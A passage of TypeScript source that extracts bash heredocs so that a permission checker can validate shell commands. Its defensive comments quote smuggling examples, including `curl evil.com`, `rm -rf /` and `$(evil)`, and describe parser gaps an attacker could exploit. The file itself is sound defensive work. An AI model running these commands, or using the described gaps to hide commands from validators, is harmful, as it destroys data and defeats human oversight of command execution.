/**
 * Heredoc extraction and restoration utilities.
 *
 * The shell-quote library parses `<<` as two separate `<` redirect operators,
 * which breaks command splitting for heredoc syntax. This module provides
 * utilities to extract heredocs before parsing and restore them after.
 *
 * Supported heredoc variations:
 * - <<WORD      - basic heredoc
 * - <<'WORD'    - single-quoted delimiter (no variable expansion in content)
 * - <<"WORD"    - double-quoted delimiter (with variable expansion)
 * - <<-WORD     - dash prefix (strips leading tabs from content)
 * - <<-'WORD'   - combined dash and quoted delimiter
 *
 * Known limitations:
 * - Heredocs inside backtick command substitution may not be extracted
 * - Very complex multi-heredoc scenarios may not be extracted
 *
 * When extraction fails, the command passes through unchanged. This is safe
 * because the unextracted heredoc will either cause shell-quote parsing to fail
 * (falling back to treating the whole command as one unit) or require manual
 * approval for each apparent subcommand.
 *
 * @module
 */

// 使用 Node/Bun 的 crypto 能力处理本地运行时资源。
import { randomBytes } from 'crypto'

// HEREDOC_PLACEHOLDER_PREFIX固定为 `'__HEREDOC_'`，作为共享工具 heredoc后续展示或比较的基准。
const HEREDOC_PLACEHOLDER_PREFIX = '__HEREDOC_'
// HEREDOC_PLACEHOLDER_SUFFIX 命名 `'__'`，让后续代码直接表达这个值的用途。
const HEREDOC_PLACEHOLDER_SUFFIX = '__'

/**
 * Generates a random hex string for placeholder uniqueness.
 * This prevents collision when command text literally contains "__HEREDOC_N__".
 */
// generatePlaceholderSalt 封装Bash 解析工具的一段完整流程，把输入整理、状态决策和输出组合在同一个入口中。
function generatePlaceholderSalt(): string {
  // Generate 8 random bytes as hex (16 characters)
  // 返回 `randomBytes(8).toString('hex')`，作为共享工具这次计算的结果。
  return randomBytes(8).toString('hex')
}

/**
 * Regex pattern for matching heredoc start syntax.
 *
 * Two alternatives handle quoted vs unquoted delimiters differently:
 *
 * Alternative 1 (quoted): (['"]) (\\?\w+) \2
 *   Captures the opening quote, then the delimiter word (which MAY include a
 *   leading backslash since it's literal inside quotes), then the closing quote.
 *   In bash, single quotes make EVERYTHING literal including backslashes:
 *     <<'\EOF' → delimiter is \EOF (with backslash)
 *     <<'EOF'  → delimiter is EOF
 *   Double quotes also preserve backslashes before non-special chars:
 *     <<"\EOF" → delimiter is \EOF
 *
 * Alternative 2 (unquoted): \\?(\w+)
 *   Optionally consumes a leading backslash (escape), then captures the word.
 *   In bash, an unquoted backslash escapes the next character:
 *     <<\EOF → delimiter is EOF (backslash consumed as escape)
 *     <<EOF  → delimiter is EOF (plain)
 *
 * SECURITY: The backslash MUST be inside the capture group for quoted
 * delimiters but OUTSIDE for unquoted ones. The old regex had \\? outside
 * the capture group unconditionally, causing <<'\EOF' to extract delimiter
 * "EOF" while bash uses "\EOF", allowing command smuggling.
 *
 * Note: Uses [ \t]* (not \s*) to avoid matching across newlines, which would be
 * a security issue (could hide commands between << and the delimiter).
 */
// HEREDOC_START_PATTERN 的表达式跨多行展开，这里先建立变量再在后续行完成计算。
const HEREDOC_START_PATTERN =
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- gated by command.includes('<<') at extractHeredocs() entry
  /(?<!<)<<(?!<)(-)?[ \t]*(?:(['"])(\\?\w+)\2|\\?(\w+))/

// HeredocInfo 固化共享工具里传递的数据形状，帮助调用方按同一结构读写字段。
export type HeredocInfo = {
  /** The full heredoc text including << operator, delimiter, content, and closing delimiter */
  fullText: string
  /** The delimiter word (without quotes) */
  delimiter: string
  /** Start position of the << operator in the original command */
  operatorStartIndex: number
  /** End position of the << operator (exclusive) - content on same line after this is preserved */
  operatorEndIndex: number
  /** Start position of heredoc content (the newline before content) */
  contentStartIndex: number
  /** End position of heredoc content including closing delimiter (exclusive) */
  contentEndIndex: number
}

// HeredocExtractionResult 固化共享工具里传递的数据形状，帮助调用方按同一结构读写字段。
export type HeredocExtractionResult = {
  /** The command with heredocs replaced by placeholders */
  processedCommand: string
  /** Map of placeholder string to original heredoc info */
  heredocs: Map<string, HeredocInfo>
}

/**
 * Extracts heredocs from a command string and replaces them with placeholders.
 *
 * This allows shell-quote to parse the command without mangling heredoc syntax.
 * After parsing, use `restoreHeredocs` to replace placeholders with original content.
 *
 * @param command - The shell command string potentially containing heredocs
 * @returns Object containing the processed command and a map of placeholders to heredoc info
 *
 * @example
 * ```ts
 * const result = extractHeredocs(`cat <<EOF
 * hello world
 * EOF`);
 * // result.processedCommand === "cat __HEREDOC_0_a1b2c3d4__" (salt varies)
 * // result.heredocs has the mapping to restore later
 * ```
 */
// extractHeredocs 承担共享工具中的独立步骤，串起共享工具 heredoc需要的输入整理、状态更新和结果输出。
export function extractHeredocs(
  command: string,
  options?: { quotedOnly?: boolean },
): HeredocExtractionResult {
  // heredocs 集合构建`new Map<string, HeredocInfo>()`，供共享工具 heredoc后续步骤使用。
  const heredocs = new Map<string, HeredocInfo>()

  // Quick check: if no << present, skip processing
  // 判断 !command.includes('<<')，将共享工具分流到只适用于该条件的处理路径。
  if (!command.includes('<<')) {
    // 返回 { processedCommand: command, heredocs }，把共享工具这个分支的结果交还调用方。
    return { processedCommand: command, heredocs }
  }

  // Security: Paranoid pre-validation. Our incremental quote/comment scanner
  // (see advanceScan below) does simplified parsing that cannot handle all
  // bash quoting constructs. If the command contains
  // constructs that could desync our quote tracking, bail out entirely
  // rather than risk extracting a heredoc with incorrect boundaries.
  // This is defense-in-depth: each construct below has caused or could
  // cause a security bypass if we attempt extraction.
  //
  // Specifically, we bail if the command contains:
  // 1. $'...' or $"..." (ANSI-C / locale quoting — our quote tracker
  //    doesn't handle the $ prefix, would misparse the quotes)
  // 2. Backtick command substitution (backtick nesting has complex parsing
  //    rules, and backtick acts as shell_eof_token for PST_EOFTOKEN in
  //    make_cmd.c:606, enabling early heredoc closure that our parser
  //    can't replicate)
  // 满足 `/\$['"]/.test(command)` 时，共享工具执行该分支。
  if (/\$['"]/.test(command)) {
    // 返回 { processedCommand: command, heredocs }，把共享工具这个分支的结果交还调用方。
    return { processedCommand: command, heredocs }
  }
  // Check for backticks in the command text before the first <<.
  // Backtick nesting has complex parsing rules, and backtick acts as
  // shell_eof_token for PST_EOFTOKEN (make_cmd.c:606), enabling early
  // heredoc closure that our parser can't replicate. We only check
  // before << because backticks in heredoc body content are harmless.
  // firstHeredocPos 集合保存`command.indexOf`，供共享工具后续处理使用。
  const firstHeredocPos = command.indexOf('<<')
  // 只有 `firstHeredocPos > 0 && command.slice(0, firstHeredocPos).includes('`')` 满足时，共享工具才执行该分支。
  if (firstHeredocPos > 0 && command.slice(0, firstHeredocPos).includes('`')) {
    // 返回结构化结果，集中表达共享工具已经整理出的状态。
    return { processedCommand: command, heredocs }
  }

  // Security: Check for arithmetic evaluation context before the first `<<`.
  // In bash, `(( x = 1 << 2 ))` uses `<<` as a BIT-SHIFT operator, not a
  // heredoc. If we mis-extract it, subsequent lines become "heredoc content"
  // and are hidden from security validators, while bash executes them as
  // separate commands. We bail entirely if `((` appears before `<<` without
  // a matching `))` — we can't reliably distinguish arithmetic `<<` from
  // heredoc `<<` in that context. Note: $(( is already caught by
  // validateDangerousPatterns, but bare (( is not.
  // 满足 `firstHeredocPos > 0` 时，共享工具执行该分支。
  if (firstHeredocPos > 0) {
    // beforeHeredoc格式化`command.slice`，供共享工具后续处理使用。
    const beforeHeredoc = command.slice(0, firstHeredocPos)
    // Count (( and )) occurrences — if unbalanced, `<<` may be arithmetic
    // openArith匹配`beforeHeredoc.match`，供共享工具后续处理使用。
    const openArith = (beforeHeredoc.match(/\(\(/g) || []).length
    // closeArith匹配`beforeHeredoc.match`，供共享工具后续处理使用。
    const closeArith = (beforeHeredoc.match(/\)\)/g) || []).length
    // 满足 `openArith > closeArith` 时，共享工具执行该分支。
    if (openArith > closeArith) {
      // 返回结构化结果，集中表达共享工具已经整理出的状态。
      return { processedCommand: command, heredocs }
    }
  }

  // Create a global version of the pattern for iteration
  // heredocStartPattern匹配`RegExp`，供共享工具后续处理使用。
  const heredocStartPattern = new RegExp(HEREDOC_START_PATTERN.source, 'g')

  // heredocMatches 集合 从空数组开始收集，后续循环会按处理顺序追加条目。
  const heredocMatches: HeredocInfo[] = []
  // Security: When quotedOnly skips an unquoted heredoc, we still need to
  // track its content range so the nesting filter can reject quoted heredocs
  // that appear INSIDE the skipped unquoted heredoc's body. Without this,
  // `cat <<EOF\n<<'SAFE'\n$(evil)\nSAFE\nEOF` would extract <<'SAFE' as a
  // top-level heredoc, hiding $(evil) from validators — even though in bash,
  // $(evil) IS executed (unquoted <<EOF expands its body).
  // skippedHeredocRanges 集合 先占位，稍后的条件分支会根据实际输入补齐它。
  const skippedHeredocRanges: Array<{
    contentStartIndex: number
    contentEndIndex: number
  }> = []
  // match 先占位，稍后的条件分支会根据实际输入补齐它。
  let match: RegExpExecArray | null

  // Incremental quote/comment scanner state.
  //
  // The regex walks forward through the command, and match.index is monotonically
  // increasing. Previously, isInsideQuotedString and isInsideComment each
  // re-scanned from position 0 on every match — O(n²) when the heredoc body
  // contains many `<<` (e.g. C++ with `std::cout << ...`). A 200-line C++
  // heredoc hit ~3.7ms per extractHeredocs call, and Bash security validation
  // calls extractHeredocs multiple times per command.
  //
  // Instead, track quote/comment/escape state incrementally and advance from
  // the last scanned position. This preserves the OLD helpers' exact semantics:
  //
  //   Quote state (was isInsideQuotedString) is COMMENT-BLIND — it never sees
  //   `#` and never skips characters for being "in a comment". Inside single
  //   quotes, everything is literal. Inside double quotes, backslash escapes
  //   the next char. An unquoted backslash run of odd length escapes the next
  //   char.
  //
  //   Comment state (was isInsideComment) observes quote state (# inside quotes
  //   is not a comment) but NOT the reverse. The old helper used a per-call
  //   `lineStart = lastIndexOf('\n', pos-1)+1` bound on which `#` to consider;
  //   equivalently, any physical `\n` clears comment state — including `\n`
  //   inside quotes (since lastIndexOf was quote-blind).
  //
  // SECURITY: Do NOT let comment mode suppress quote-state updates. If `#` put
  // the scanner in a mode that skipped quote chars, then `echo x#"\n<<...`
  // (where bash treats `#` as part of the word `x#`, NOT a comment) would
  // report the `<<` as unquoted and EXTRACT it — hiding content from security
  // validators. The old isInsideQuotedString was comment-blind; we preserve
  // that. Both old and new over-eagerly treat any unquoted `#` as a comment
  // (bash requires word-start), but since quote tracking is independent, the
  // over-eagerness only affects the comment check — causing SKIPS (safe
  // direction), never extra EXTRACTIONS.
  // scanPos 集合保存`0`，供后续判断或组装使用。
  let scanPos = 0
  // scanInSingleQuote标记共享工具 heredoc是否启用对应路径。
  let scanInSingleQuote = false
  // scanInDoubleQuote标记共享工具 heredoc是否启用对应路径。
  let scanInDoubleQuote = false
  // scanInComment标记共享工具 heredoc是否启用对应路径。
  let scanInComment = false
  // Inside "...": true if the previous char was a backslash (next char is escaped).
  // Carried across advanceScan calls so a `\` at scanPos-1 correctly escapes
  // the char at scanPos.
  // scanDqEscapeNext标记共享工具 heredoc是否启用对应路径。
  let scanDqEscapeNext = false
  // Unquoted context: length of the consecutive backslash run ending at scanPos-1.
  // Used to determine if the char at scanPos is escaped (odd run = escaped).
  // scanPendingBackslashes 集合保存`0`，供共享工具 heredoc后续判断或输出使用。
  let scanPendingBackslashes = 0

  // advanceScan封装成回调，供共享工具 heredoc在事件触发或异步步骤中调用。
  const advanceScan = (target: number): void => {
    // 循环处理 `let i = scanPos; i < target; i++`，让共享工具逐项把同类条目按顺序走完。
    for (let i = scanPos; i < target; i++) {
      // ch 命名 `command[i]!`，让后续代码直接表达这个值的用途。
      const ch = command[i]!

      // Any physical newline clears comment state. The old isInsideComment
      // used `lineStart = lastIndexOf('\n', pos-1)+1` (quote-blind), so a
      // `\n` inside quotes still advanced lineStart. Match that here by
      // clearing BEFORE the quote branches.
      // 当 `ch` 匹配 `'\n'` 时，共享工具执行对应分支。
      if (ch === '\n') scanInComment = false

      // 满足 `scanInSingleQuote` 时，共享工具执行该分支。
      if (scanInSingleQuote) {
        // 当 `ch` 匹配 `"'"` 时，共享工具执行对应分支。
        if (ch === "'") scanInSingleQuote = false
        // 跳过当前项，继续处理共享工具中的下一轮循环。
        continue
      }

      // 满足 `scanInDoubleQuote` 时，共享工具执行该分支。
      if (scanInDoubleQuote) {
        // 满足 `scanDqEscapeNext` 时，共享工具执行该分支。
        if (scanDqEscapeNext) {
          // scanDqEscapeNext更新为 `false`，确保Bash 解析工具后续读取最新状态。
          scanDqEscapeNext = false
          // 跳过当前项，继续处理共享工具中的下一轮循环。
          continue
        }
        // 当 `ch` 匹配 `'\\'` 时，共享工具执行对应分支。
        if (ch === '\\') {
          // scanDqEscapeNext更新为 `true`，确保Bash 解析工具后续读取最新状态。
          scanDqEscapeNext = true
          // 跳过当前项，继续处理共享工具中的下一轮循环。
          continue
        }
        // 当 `ch` 匹配 `'"'` 时，共享工具执行对应分支。
        if (ch === '"') scanInDoubleQuote = false
        // 跳过当前项，继续处理共享工具中的下一轮循环。
        continue
      }

      // Unquoted context. Quote tracking is COMMENT-BLIND (same as the old
      // isInsideQuotedString): we do NOT skip chars for being inside a
      // comment. Only the `#` detection itself is gated on not-in-comment.
      // 当 `ch` 匹配 `'\\'` 时，共享工具执行对应分支。
      if (ch === '\\') {
        // 共享工具 heredoc在这里处理 `scanPendingBackslashes++`，完成这一小步状态转换。
        scanPendingBackslashes++
        // 跳过当前项，继续处理共享工具中的下一轮循环。
        continue
      }
      // escaped标记共享工具 heredoc是否启用对应路径。
      const escaped = scanPendingBackslashes % 2 === 1
      // scanPendingBackslashes 集合更新为 `0`，确保Bash 解析工具后续读取最新状态。
      scanPendingBackslashes = 0
      // 满足 `escaped` 时，共享工具执行该分支。
      if (escaped) continue

      // 当 `ch` 匹配 `"'"` 时，共享工具执行对应分支。
      if (ch === "'") scanInSingleQuote = true
      else if (ch === '"') scanInDoubleQuote = true
      else if (!scanInComment && ch === '#') scanInComment = true
    }
    // scanPos 集合更新为 `target`，确保Bash 解析工具后续读取最新状态。
    scanPos = target
  }

  // 只要 (match = heredocStartPattern.exec(command)) !== null 成立，就持续推进共享工具中的循环处理。
  while ((match = heredocStartPattern.exec(command)) !== null) {
    // startIndex 索引保存`match.index`，供后续判断或组装使用。
    const startIndex = match.index

    // Advance the incremental scanner to this match's position. After this,
    // scanInSingleQuote/scanInDoubleQuote/scanInComment reflect the parser
    // state immediately BEFORE startIndex, and scanPendingBackslashes is the
    // count of unquoted `\` immediately preceding startIndex.
    // 调用 advanceScan，触发共享工具此处需要的副作用。
    advanceScan(startIndex)

    // Skip if this << is inside a quoted string (not a real heredoc operator).
    // 只有 `scanInSingleQuote || scanInDoubleQuote` 满足时，共享工具才执行该分支。
    if (scanInSingleQuote || scanInDoubleQuote) {
      // 跳过当前项，继续处理共享工具中的下一轮循环。
      continue
    }

    // Security: Skip if this << is inside a comment (after unquoted #).
    // In bash, `# <<EOF` is a comment — extracting it would hide commands on
    // subsequent lines as "heredoc content" while bash executes them.
    // 满足 `scanInComment` 时，共享工具执行该分支。
    if (scanInComment) {
      // 跳过当前项，继续处理共享工具中的下一轮循环。
      continue
    }

    // Security: Skip if this << is preceded by an odd number of backslashes.
    // In bash, `\<<EOF` is NOT a heredoc — `\<` is a literal `<`, then `<EOF`
    // is input redirection. Extracting it would drop same-line commands from
    // security checks. The scanner tracks the unquoted backslash run ending
    // immediately before startIndex (scanPendingBackslashes).
    // 满足 `scanPendingBackslashes % 2 === 1` 时，共享工具执行该分支。
    if (scanPendingBackslashes % 2 === 1) {
      // 跳过当前项，继续处理共享工具中的下一轮循环。
      continue
    }

    // Security: Bail if this `<<` falls inside the body of a previously
    // SKIPPED heredoc (unquoted heredoc in quotedOnly mode). In bash,
    // `<<` inside a heredoc body is just text — it's not a nested heredoc
    // operator. Extracting it would hide content that bash actually expands.
    // insideSkipped标记共享工具 heredoc是否启用对应路径。
    let insideSkipped = false
    // 按顺序遍历 `skippedHeredocRanges` 中的skipped，逐个交给共享工具处理。
    for (const skipped of skippedHeredocRanges) {
      // 共享工具在这里按实际状态进入对应分支。
      if (
        startIndex > skipped.contentStartIndex &&
        startIndex < skipped.contentEndIndex
      ) {
        // insideSkipped更新为 `true`，确保Bash 解析工具后续读取最新状态。
        insideSkipped = true
        // 结束这个分支或循环，避免共享工具继续落入后续路径。
        break
      }
    }
    // 满足 `insideSkipped` 时，共享工具执行该分支。
    if (insideSkipped) {
      // 跳过当前项，继续处理共享工具中的下一轮循环。
      continue
    }

    // fullMatch读取 `match[0]` 对应条目，后续围绕该成员继续处理。
    const fullMatch = match[0]
    // isDash标记共享工具 heredoc是否启用对应路径。
    const isDash = match[1] === '-'
    // Group 3 = quoted delimiter (may include backslash), group 4 = unquoted
    // delimiter标记共享工具 heredoc是否启用对应路径。
    const delimiter = (match[3] || match[4])!
    // operatorEndIndex 索引记录 `startIndex + fullMatch.length` 是否成立，下一步按该结果分支。
    const operatorEndIndex = startIndex + fullMatch.length

    // Security: Two checks to verify our regex captured the full delimiter word.
    // Any mismatch between our parsed delimiter and bash's actual delimiter
    // could allow command smuggling past permission checks.

    // Check 1: If a quote was captured (group 2), verify the closing quote
    // was actually matched by \2 in the regex (the quoted alternative requires
    // the closing quote). The regex's \w+ only matches [a-zA-Z0-9_], so
    // non-word chars inside quotes (spaces, hyphens, dots) cause \w+ to stop
    // early, leaving the closing quote unmatched.
    // Example: <<"EO F" — regex captures "EO", misses closing ", delimiter
    // should be "EO F" but we'd use "EO". Skip to prevent mismatch.
    // quoteChar保存`match[2]`，供共享工具 heredoc后续判断或输出使用。
    const quoteChar = match[2]
    // `quoteChar && command[operatorEndIndex - 1]` 与 `qu` 不一致时刷新派生状态，避免使用过期结果。
    if (quoteChar && command[operatorEndIndex - 1] !== quoteChar) {
      // 跳过当前项，继续处理共享工具中的下一轮循环。
      continue
    }

    // Security: Determine if the delimiter is quoted ('EOF', "EOF") or
    // escaped (\EOF). In bash, quoted/escaped delimiters suppress all
    // expansion in the heredoc body — content is literal text. Unquoted
    // delimiters (<<EOF) perform full shell expansion: $(), backticks,
    // and ${} in the body ARE executed. When quotedOnly is set, skip
    // unquoted heredocs so their bodies remain visible to security
    // validators (they may contain executable command substitutions).
    // isEscapedDelimiter记录 `fullMatch.includes` 是否成立，共享工具随后按该结果分支。
    const isEscapedDelimiter = fullMatch.includes('\\')
    // isQuotedOrEscaped标记共享工具 heredoc是否启用对应路径。
    const isQuotedOrEscaped = !!quoteChar || isEscapedDelimiter
    // Note: We do NOT skip unquoted heredocs here anymore when quotedOnly is
    // set. Instead, we compute their content range and add them to
    // skippedHeredocRanges, then skip them AFTER finding the closing
    // delimiter. This lets the nesting filter correctly reject quoted
    // "heredocs" that appear inside unquoted heredoc bodies.

    // Check 2: Verify the next character after our match is a bash word
    // terminator (metacharacter or end of string). Characters like word chars,
    // quotes, $, \ mean the bash word extends beyond our match
    // (e.g., <<'EOF'a where bash uses "EOFa" but we captured "EOF").
    // IMPORTANT: Only match bash's actual metacharacters — space (0x20),
    // tab (0x09), newline (0x0A), |, &, ;, (, ), <, >. Do NOT use \s which
    // also matches \r, \f, \v, and Unicode whitespace that bash treats as
    // regular word characters, not terminators.
    // 满足 `operatorEndIndex < command.length` 时，共享工具执行该分支。
    if (operatorEndIndex < command.length) {
      // nextChar保存`command[operatorEndIndex]!`，供共享工具 heredoc后续判断或输出使用。
      const nextChar = command[operatorEndIndex]!
      // 满足 `!/^[ \t\n|&;()<>]$/.test(nextChar)` 时，共享工具执行该分支。
      if (!/^[ \t\n|&;()<>]$/.test(nextChar)) {
        // 跳过当前项，继续处理共享工具中的下一轮循环。
        continue
      }
    }

    // In bash, heredoc content starts on the NEXT LINE after the operator.
    // Any content on the same line after <<EOF (like " && echo done") is part
    // of the command, not the heredoc content.
    //
    // SECURITY: The "same line" must be the LOGICAL command line, not the
    // first physical newline. Multi-line quoted strings extend the logical
    // line — bash waits for the quote to close before starting to read the
    // heredoc body. A quote-blind `indexOf('\n')` finds newlines INSIDE
    // quoted strings, causing the body to start too early.
    //
    // Exploit: `echo <<'EOF' '${}\n' ; curl evil.com\nEOF`
    //   - The `\n` inside `'${}\n'` is quoted (literal newline in a string arg)
    //   - Bash: waits for `'` to close → logical line is
    //     `echo <<'EOF' '${}\n' ; curl evil.com` → heredoc body = `EOF`
    //   - Our old code: indexOf('\n') finds the quoted newline → body starts
    //     at `' ; curl evil.com\nEOF` → curl swallowed into placeholder →
    //     NEVER reaches permission checks.
    //
    // Fix: scan forward from operatorEndIndex using quote-state tracking,
    // finding the first newline that's NOT inside a quoted string. Same
    // quote-tracking semantics as advanceScan (already used to validate
    // the `<<` operator position above).
    // firstNewlineOffset保存`-1`，供后续判断或组装使用。
    let firstNewlineOffset = -1
    {
      // inSingleQuote标记共享工具 heredoc是否启用对应路径。
      let inSingleQuote = false
      // inDoubleQuote标记共享工具 heredoc是否启用对应路径。
      let inDoubleQuote = false
      // We start with clean quote state — advanceScan already rejected the
      // case where the `<<` operator itself is inside a quote.
      // 循环处理 `let k = operatorEndIndex; k < command.length; k++`，让共享工具逐项把同类条目按顺序走完。
      for (let k = operatorEndIndex; k < command.length; k++) {
        // ch读取 `command[k]` 对应条目，后续围绕该成员继续处理。
        const ch = command[k]
        // 满足 `inSingleQuote` 时，共享工具执行该分支。
        if (inSingleQuote) {
          // 当 `ch` 匹配 `"'"` 时，共享工具执行对应分支。
          if (ch === "'") inSingleQuote = false
          // 跳过当前项，继续处理共享工具中的下一轮循环。
          continue
        }
        // 满足 `inDoubleQuote` 时，共享工具执行该分支。
        if (inDoubleQuote) {
          // 当 `ch` 匹配 `'\\'` 时，共享工具执行对应分支。
          if (ch === '\\') {
            // 共享工具 heredoc在这里处理 `k++ // skip escaped char inside double quotes`，完成这一小步状态转换。
            k++ // skip escaped char inside double quotes
            // 跳过当前项，继续处理共享工具中的下一轮循环。
            continue
          }
          // 当 `ch` 匹配 `'"'` 时，共享工具执行对应分支。
          if (ch === '"') inDoubleQuote = false
          // 跳过当前项，继续处理共享工具中的下一轮循环。
          continue
        }
        // Unquoted context
        // 当 `ch` 匹配 `'\n'` 时，共享工具执行对应分支。
        if (ch === '\n') {
          // firstNewlineOffset更新为 `k - operatorEndIndex`，确保Bash 解析工具后续读取最新状态。
          firstNewlineOffset = k - operatorEndIndex
          // 结束这个分支或循环，避免共享工具继续落入后续路径。
          break
        }
        // Count backslashes for escape detection in unquoted context
        // backslashCount 数量 命名 `0`，让后续代码直接表达这个值的用途。
        let backslashCount = 0
        // 循环处理 `let j = k - 1; j >= operatorEndIndex && command[j`，让共享工具逐项把同类条目按顺序走完。
        for (let j = k - 1; j >= operatorEndIndex && command[j] === '\\'; j--) {
          // 共享工具 heredoc在这里处理 `backslashCount++`，完成这一小步状态转换。
          backslashCount++
        }
        // 满足 `backslashCount % 2 === 1` 时，共享工具执行该分支。
        if (backslashCount % 2 === 1) continue // escaped char
        // 当 `ch` 匹配 `"'"` 时，共享工具执行对应分支。
        if (ch === "'") inSingleQuote = true
        else if (ch === '"') inDoubleQuote = true
      }
      // If we ended while still inside a quote, the logical line never ends —
      // there is no heredoc body. Leave firstNewlineOffset as -1 (handled below).
    }

    // If no unquoted newline found, this heredoc has no content - skip it
    // 满足 `firstNewlineOffset === -1` 时，共享工具执行该分支。
    if (firstNewlineOffset === -1) {
      // 跳过当前项，继续处理共享工具中的下一轮循环。
      continue
    }

    // Security: Check for backslash-newline continuation at the end of the
    // same-line content (text between the operator and the newline). In bash,
    // `\<newline>` joins lines BEFORE heredoc parsing — so:
    //   cat <<'EOF' && \
    //   rm -rf /
    //   content
    //   EOF
    // bash joins to `cat <<'EOF' && rm -rf /` (rm is part of the command line),
    // then heredoc body = `content`. Our extractor runs BEFORE continuation
    // joining (commands.ts:82), so it would put `rm -rf /` in the heredoc body,
    // hiding it from all validators. Bail if same-line content ends with an
    // odd number of backslashes.
    // sameLineContent格式化`command.slice`，供共享工具后续处理使用。
    const sameLineContent = command.slice(
      operatorEndIndex,
      operatorEndIndex + firstNewlineOffset,
    )
    // trailingBackslashes 集合 命名 `0`，让后续代码直接表达这个值的用途。
    let trailingBackslashes = 0
    // 循环处理 `let j = sameLineContent.length - 1; j >= 0; j--`，让共享工具逐项把同类条目按顺序走完。
    for (let j = sameLineContent.length - 1; j >= 0; j--) {
      // 当 `sameLineContent[j]` 匹配 `'\\'` 时，共享工具执行对应分支。
      if (sameLineContent[j] === '\\') {
        // 共享工具 heredoc在这里处理 `trailingBackslashes++`，完成这一小步状态转换。
        trailingBackslashes++
      } else {
        // 结束这个分支或循环，避免共享工具继续落入后续路径。
        break
      }
    }
    // 满足 `trailingBackslashes % 2 === 1` 时，共享工具执行该分支。
    if (trailingBackslashes % 2 === 1) {
      // Odd number of trailing backslashes → last one escapes the newline
      // → this is a line continuation. Our heredoc-before-continuation order
      // would misparse this. Bail out.
      // 跳过当前项，继续处理共享工具中的下一轮循环。
      continue
    }

    // contentStartIndex 索引 命名 `operatorEndIndex + firstNewlineOffset`，让后续代码直接表达这个值的用途。
    const contentStartIndex = operatorEndIndex + firstNewlineOffset
    // afterNewline格式化`command.slice`，供共享工具后续处理使用。
    const afterNewline = command.slice(contentStartIndex + 1) // +1 to skip the newline itself
    // contentLines 集合格式化`afterNewline.split`，供共享工具后续处理使用。
    const contentLines = afterNewline.split('\n')

    // Find the closing delimiter - must be on its own line
    // Security: Must match bash's exact behavior to prevent parsing discrepancies
    // that could allow command smuggling past permission checks.
    // closingLineIndex 索引 命名 `-1`，让后续代码直接表达这个值的用途。
    let closingLineIndex = -1
    // 按索引扫描 `contentLines.length`，需要消费相邻参数时可以精确移动游标。
    for (let i = 0; i < contentLines.length; i++) {
      // line读取 `contentLines[i]!` 对应条目，后续围绕该成员继续处理。
      const line = contentLines[i]!

      // 满足 `isDash` 时，共享工具执行该分支。
      if (isDash) {
        // <<- strips leading TABS only (not spaces), per POSIX/bash spec.
        // The line after stripping leading tabs must be exactly the delimiter.
        // stripped格式化`line.replace`，供共享工具后续处理使用。
        const stripped = line.replace(/^\t*/, '')
        // 满足 `stripped === delimiter` 时，共享工具执行该分支。
        if (stripped === delimiter) {
          // closingLineIndex 索引更新为 `i`，确保Bash 解析工具后续读取最新状态。
          closingLineIndex = i
          // 结束这个分支或循环，避免共享工具继续落入后续路径。
          break
        }
      } else {
        // << requires the closing delimiter to be exactly alone on the line
        // with NO leading or trailing whitespace. This matches bash behavior.
        // 满足 `line === delimiter` 时，共享工具执行该分支。
        if (line === delimiter) {
          // closingLineIndex 索引更新为 `i`，确保Bash 解析工具后续读取最新状态。
          closingLineIndex = i
          // 结束这个分支或循环，避免共享工具继续落入后续路径。
          break
        }
      }

      // Security: Check for PST_EOFTOKEN-like early closure (make_cmd.c:606).
      // Inside $(), ${}, or backtick substitution, bash closes a heredoc when
      // a line STARTS with the delimiter and contains the shell_eof_token
      // (`)`, `}`, or backtick) anywhere after it. Our parser only does exact
      // line matching, so this discrepancy could hide smuggled commands.
      //
      // Paranoid extension: also bail on bash metacharacters (|, &, ;, (, <,
      // >) after the delimiter, which could indicate command syntax from a
      // parsing discrepancy we haven't identified.
      //
      // For <<- heredocs, bash strips leading tabs before this check.
      // eofCheckLine格式化`line.replace`，供共享工具后续处理使用。
      const eofCheckLine = isDash ? line.replace(/^\t*/, '') : line
      // 共享工具在这里按实际状态进入对应分支。
      if (
        eofCheckLine.length > delimiter.length &&
        eofCheckLine.startsWith(delimiter)
      ) {
        // charAfterDelimiter记录 `eofCheckLine[delimiter.length]!` 是否成立，下一步按该结果分支。
        const charAfterDelimiter = eofCheckLine[delimiter.length]!
        // 满足 `/^[)}`|&;(<>]$/.test(charAfterDelimiter)` 时，共享工具执行该分支。
        if (/^[)}`|&;(<>]$/.test(charAfterDelimiter)) {
          // Shell metacharacter or substitution closer after delimiter —
          // bash may close the heredoc early here. Bail out.
          closingLineIndex = -1
          break
        }
      }
    }

    // Security: If quotedOnly mode is set and this is an unquoted heredoc,
    // record its content range for nesting checks but do NOT add it to
    // heredocMatches. This ensures quoted "heredocs" inside its body are
    // correctly rejected by the insideSkipped check on subsequent iterations.
    //
    // CRITICAL: We do this BEFORE the closingLineIndex === -1 check. If the
    // unquoted heredoc has no closing delimiter, bash still treats everything
    // to end-of-input as the heredoc body (and expands $() within it). We
    // must block extraction of any subsequent quoted "heredoc" that falls
    // inside that unbounded body.
    if (options?.quotedOnly && !isQuotedOrEscaped) {
      let skipContentEndIndex: number
      if (closingLineIndex === -1) {
        // No closing delimiter — in bash, heredoc body extends to end of
        // input. Track the entire remaining range as "skipped body".
        skipContentEndIndex = command.length
      } else {
        const skipLinesUpToClosing = contentLines.slice(0, closingLineIndex + 1)
        const skipContentLength = skipLinesUpToClosing.join('\n').length
        skipContentEndIndex = contentStartIndex + 1 + skipContentLength
      }
      skippedHeredocRanges.push({
        contentStartIndex,
        contentEndIndex: skipContentEndIndex,
      })
      continue
    }

    // If no closing delimiter found, this is malformed - skip it
    if (closingLineIndex === -1) {
      continue
    }

    // Calculate end position: contentStartIndex + 1 (newline) + length of lines up to and including closing delimiter
    const linesUpToClosing = contentLines.slice(0, closingLineIndex + 1)
    const contentLength = linesUpToClosing.join('\n').length
    const contentEndIndex = contentStartIndex + 1 + contentLength

    // Security: Bail if this heredoc's content range OVERLAPS with any
    // previously-skipped heredoc's content range. This catches the case where
    // two heredocs share a command line (`cat <<EOF <<'SAFE'`) and the first
    // is unquoted (skipped in quotedOnly mode). In bash, when multiple heredocs
    // share a line, their bodies appear SEQUENTIALLY (first's body, then
    // second's). Both compute contentStartIndex from the SAME newline, so the
    // second's body search walks through the first's body. For:
    //   cat <<EOF <<'SAFE'
    //   $(evil_command)
    //   EOF
    //   safe body
    //   SAFE
    // ...the quoted <<'SAFE' would incorrectly extract lines 2-4 as its body,
    // swallowing `$(evil_command)` (which bash EXECUTES via the unquoted
